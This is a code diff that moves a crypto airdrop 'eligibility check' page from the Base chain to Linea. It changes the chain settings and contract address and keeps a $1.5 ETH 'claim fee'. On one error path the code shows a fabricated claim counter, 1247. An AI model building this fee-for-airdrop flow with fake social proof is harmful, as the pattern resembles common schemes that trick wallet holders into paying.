@@ -22,8 +22,8 @@ const ALLOWLIST = [
   "0x44afd3500643930319bb16B4a5c3a1e71638888d",
 ]
 
-const CONTRACT_ADDRESS = "0xYOUR_CONTRACT_ADDRESS" // ⚠️ REPLACE WITH YOUR ACTUAL BASE CONTRACT ADDRESS
-const BASE_CHAIN_ID = "0x2105" // Base mainnet chain ID (8453)
+const CONTRACT_ADDRESS = "0x4f275a1fF7eD21721dB7cb07efF523aBb2AD2e85" // Linea contract address
+const LINEA_CHAIN_ID = "0x3B" // Linea mainnet chain ID (59)
 
 const isValidContractAddress = CONTRACT_ADDRESS !== "0xYOUR_CONTRACT_ADDRESS" && CONTRACT_ADDRESS.length === 42
 
@@ -71,33 +71,31 @@ export default function HomePage() {
 
       if (typeof window !== "undefined" && window.ethereum) {
         try {
-          // Switch to Base network
           await window.ethereum.request({
             method: "wallet_switchEthereumChain",
-            params: [{ chainId: BASE_CHAIN_ID }],
+            params: [{ chainId: LINEA_CHAIN_ID }],
           })
         } catch (networkError: any) {
-          // If Base network is not added, add it
           if (networkError.code === 4902) {
             try {
               await window.ethereum.request({
                 method: "wallet_addEthereumChain",
                 params: [
                   {
-                    chainId: BASE_CHAIN_ID,
-                    chainName: "Base",
+                    chainId: LINEA_CHAIN_ID,
+                    chainName: "Linea",
                     nativeCurrency: {
                       name: "Ethereum",
                       symbol: "ETH",
                       decimals: 18,
                     },
-                    rpcUrls: ["https://mainnet.base.org"],
-                    blockExplorerUrls: ["https://basescan.org"],
+                    rpcUrls: ["https://rpc.linea.build"],
+                    blockExplorerUrls: ["https://lineascan.build"],
                   },
                 ],
               })
             } catch (addError) {
-              console.error("Failed to add Base network:", addError)
+              console.error("Failed to add Linea network:", addError)
               setTotalClaimed(1247)
               return
             }
@@ -175,11 +173,10 @@ export default function HomePage() {
         setConnectedAddress(accounts[0])
         setIsConnected(true)
 
-        // Switch to Base network
         try {
           await window.ethereum.request({
             method: "wallet_switchEthereumChain",
-            params: [{ chainId: BASE_CHAIN_ID }],
+            params: [{ chainId: LINEA_CHAIN_ID }],
           })
         } catch (switchError: any) {
           if (switchError.code === 4902) {
@@ -188,21 +185,21 @@ export default function HomePage() {
                 method: "wallet_addEthereumChain",
                 params: [
                   {
-                    chainId: BASE_CHAIN_ID,
-                    chainName: "Base",
+                    chainId: LINEA_CHAIN_ID,
+                    chainName: "Linea",
                     nativeCurrency: {
                       name: "Ethereum",
                       symbol: "ETH",
                       decimals: 18,
                     },
-                    rpcUrls: ["https://mainnet.base.org"],
-                    blockExplorerUrls: ["https://basescan.org"],
+                    rpcUrls: ["https://rpc.linea.build"],
+                    blockExplorerUrls: ["https://lineascan.build"],
                   },
                 ],
               })
             } catch (addError) {
-              console.error("Failed to add Base network:", addError)
-              alert("Please manually add Base network to your wallet")
+              console.error("Failed to add Linea network:", addError)
+              alert("Please manually add Linea network to your wallet")
             }
           }
         }
@@ -265,10 +262,9 @@ export default function HomePage() {
     setIsClaiming(true)
     try {
       if (window.ethereum) {
-        // Ensure we're on Base network
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: BASE_CHAIN_ID }],
+          params: [{ chainId: LINEA_CHAIN_ID }],
         })
 
         // Calculate $1.5 in wei (approximately 0.0005 ETH, adjust based on current ETH price)
@@ -314,7 +310,7 @@ export default function HomePage() {
     <div className="min-h-screen bg-gradient-to-br from-blue-500 via-blue-600 to-blue-700 flex flex-col items-center justify-center text-white px-4">
       {!isValidContractAddress && (
         <div className="fixed top-4 left-4 right-4 bg-yellow-500/20 border border-yellow-300/30 rounded-lg p-3 text-yellow-100 text-sm backdrop-blur-sm">
-          ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Base contract address.
+          ⚠️ Contract address not configured. Replace CONTRACT_ADDRESS with your actual Linea contract address.
         </div>
       )}
 
@@ -326,7 +322,7 @@ export default function HomePage() {
       </div>
 
       {/* Main Title */}
-      <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide">PEOPLEONBASE</h1>
+      <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide">PEOPLEONLINEA</h1>
 
       {/* Subtitle */}
       <p className="text-lg md:text-xl text-blue-100 mb-8 text-center">Check your wallet eligibility</p>
@@ -398,7 +394,7 @@ export default function HomePage() {
 
               {checkResult === "eligible" && !hasClaimed && (
                 <div className="mt-4 space-y-2">
-                  <div className="text-xs text-green-200 mb-2">Claim fee: $1.5 (paid on Base network)</div>
+                  <div className="text-xs text-green-200 mb-2">Claim fee: $1.5 (paid on Linea network)</div>
                   <button
                     onClick={handleClaim}
                     disabled={isClaiming}
